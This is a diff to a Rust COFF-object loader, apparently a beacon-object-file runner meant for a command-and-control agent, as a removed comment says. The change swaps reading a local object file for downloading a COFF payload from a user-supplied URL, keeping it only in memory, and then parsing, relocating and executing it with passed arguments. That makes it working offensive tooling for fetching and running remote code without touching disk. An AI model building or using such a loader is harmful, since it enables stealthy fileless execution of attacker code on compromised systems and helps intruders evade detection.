@@ -3,64 +3,90 @@ use crate::imports;
 use crate::validation;
 use crate::loader;
 
-use std::fs::File;
 use std::process;
 use std::ffi::CString;
-use memmap2::Mmap;
+use std::time::Duration;
+use reqwest::blocking::Client;
 use imports::dependencies::analyze_dependencies;
 
 /// Toggle verbose COFF-loader diagnostics.
-///
-/// `true`  -> full parse/validate/relocation dump (develop)
-/// `false` -> silent operation, only the payload's own output appears
-///
-/// When integrating into a C2 agent, set this from your tasking
-/// (e.g. `let develop_mode = task_args.develop;`) and pass it into
-/// `loader::load_and_execute`.
-//const DEVELOP_MODE: bool = false;
 const DEVELOP_MODE: bool = true;
 
-pub fn run(args: CString) {
+pub fn run(args: &[String]) {
     let develop_mode = DEVELOP_MODE;
 
-    // Hardcoded payload path — no CLI arguments.
-    let file_path = "listprocess-raw.o";
-
-    let file = File::open(file_path).unwrap_or_else(|e| {
-        eprintln!("Failed to open file: {}", e);
+    // args[0] = URL, args[1..] = payload argv.
+    let url = args.get(0).map(|s| s.as_str()).unwrap_or_else(|| {
+        eprintln!("Usage: <url> [payload-argv...]");
         process::exit(1);
     });
 
-    let metadata = file.metadata().unwrap_or_else(|e| {
-        eprintln!("Failed to read file metadata: {}", e);
-        process::exit(1);
-    });
-
-    if metadata.len() == 0 {
-        eprintln!("Input file is empty");
+    if url.is_empty() {
+        eprintln!("Empty URL argument");
         process::exit(1);
     }
 
-    let mmap = unsafe {
-        Mmap::map(&file).unwrap_or_else(|e| {
-            eprintln!("Failed to map file: {}", e);
-            process::exit(1);
-        })
-    };
+    if !(url.starts_with("http://") || url.starts_with("https://")) {
+        eprintln!("Invalid URL (must be http/https): {}", url);
+        process::exit(1);
+    }
+
+    // Payload argv = everything after the URL.
+    let payload_argv = args.get(1..).unwrap_or(&[]).join(" ");
+    let payload_args = CString::new(payload_argv).unwrap_or_else(|e| {
+        eprintln!("Invalid payload argv (embedded NUL): {}", e);
+        process::exit(1);
+    });
 
     if develop_mode {
-        println!("Input: {}", file_path);
-        println!("Size: {} bytes", mmap.len());
+        println!("Fetching: {}", url);
+    }
+
+    // ---- Fetch the COFF object into RAM only ----
+    let client = Client::builder()
+        .timeout(Duration::from_secs(120))
+        .build()
+        .unwrap_or_else(|e| {
+            eprintln!("Failed to build HTTP client: {}", e);
+            process::exit(1);
+        });
+
+    let response = client.get(url).send().unwrap_or_else(|e| {
+        eprintln!("Failed to send request: {}", e);
+        process::exit(1);
+    });
+
+    if !response.status().is_success() {
+        eprintln!("HTTP error: {}", response.status());
+        process::exit(1);
+    }
+
+    let bytes: Vec<u8> = response.bytes().unwrap_or_else(|e| {
+        eprintln!("Failed to read response body: {}", e);
+        process::exit(1);
+    }).to_vec();
+
+    if bytes.is_empty() {
+        eprintln!("Downloaded payload is empty");
+        process::exit(1);
+    }
+
+    // Everything downstream works on `bytes` (a &[u8]) — same as `mmap` before.
+    let payload: &[u8] = &bytes;
+
+    if develop_mode {
+        println!("Input: {}", url);
+        println!("Size: {} bytes", payload.len());
     }
 
     // 1. Parse
-    let object = coff::parse(&mmap).unwrap_or_else(|e| {
+    let object = coff::parse(payload).unwrap_or_else(|e| {
         eprintln!("COFF parsing failed: {}", e);
         process::exit(1);
     });
 
     // 2. Validate
-    if let Err(e) = validation::validate(&object, mmap.len()) {
+    if let Err(e) = validation::validate(&object, payload.len()) {
         eprintln!("Validation failed: {}", e);
         process::exit(1);
     }
@@ -97,8 +123,8 @@ pub fn run(args: CString) {
         println!("\n========== LOADING & EXECUTING ==========");
     }
 
-    // 4. Load & execute
-    if let Err(e) = loader::load_and_execute(&object, &mmap, develop_mode, &args) {
+    // 4. Load & execute — `payload_args` is the CString load_and_execute wants.
+    if let Err(e) = loader::load_and_execute(&object, payload, develop_mode, &payload_args) {
         eprintln!("Execution failed: {}", e);
         process::exit(1);
     }
